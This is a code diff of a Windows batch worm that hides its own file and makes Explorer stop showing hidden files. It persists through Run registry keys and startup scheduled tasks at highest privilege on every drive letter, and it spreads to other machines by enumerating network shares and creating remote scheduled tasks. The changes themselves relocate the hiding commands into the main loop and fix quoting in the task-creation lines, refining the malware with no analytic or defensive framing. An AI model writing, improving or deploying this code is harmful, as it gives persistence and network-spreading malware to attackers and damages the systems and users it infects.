@@ -81,9 +81,6 @@ if not exist "%path_desktop%" (for /f "skip=2 tokens=2,* delims= " %%i in ('reg 
 %module_fileTouch% /w /a /c /d %app_date% "%~dpnx0"
 attrib +h +r +s "%~dpnx0"
 
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"    /v Hidden /t REG_DWORD /d 2 /f >nul
-reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 29     /t REG_SZ    /d "%windir%\System32\shell32.dll,-50" /f >nul
-
 
 
 
@@ -92,6 +89,13 @@ reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v
 
 :cycle
 if exist "%path_desktop%\09.11.2001" goto :selfRemover
+
+
+
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"    /v Hidden /t REG_DWORD /d 2 /f >nul
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 29     /t REG_SZ    /d "%windir%\System32\shell32.dll,-50" /f >nul
+
+
 
 if not exist "%path_autoRun1%\%~nx0" copy /y "%~dpnx0" "%path_autoRun1%\"
 if exist "%path_autoRun1%\%~nx0" (
@@ -136,7 +140,7 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
         reg add HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%~nx0" /f
         reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%~nx0" /f
         reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%~nx0" /f
-        schtasks /create /sc onstart /tn "%app_name% %%i" /tr %%i:\%~nx0 /f /rl highest
+        schtasks /create /sc onstart /tn "%app_name% %%i" /tr "%%i:\%~nx0" /f /rl highest
       )>nul 2>nul
       attrib +h +r +s "%%i:\%~nx0"
 
@@ -183,7 +187,7 @@ timeout /nobreak /t 5 >nul
 for /f "skip=3 tokens=1,* delims= " %%i in ('net view') do if /i "%%i" NEQ "The" (
   for /f "skip=7 tokens=1,* delims= " %%j in ('net view %%i') do if /i "%%j" NEQ "The" (
     if exist "%%i\%%j\%~nx0" (
-      (for /f "delims=\" %%z in ("%%i") do schtasks /create /s %%z /sc onstart /tn "%app_name% %%j" /tr %%j:\%~nx0 /f /rl highest)>nul 2>nul
+      (for /f "delims=\" %%z in ("%%i") do schtasks /create /s %%z /sc onstart /tn "%app_name% %%j" /tr "%%j:\%~nx0" /f /rl highest)>nul 2>nul
       attrib +h +r +s "%%i\%%j\%~nx0"
 
       if /i "%%j:" NEQ "C:" (
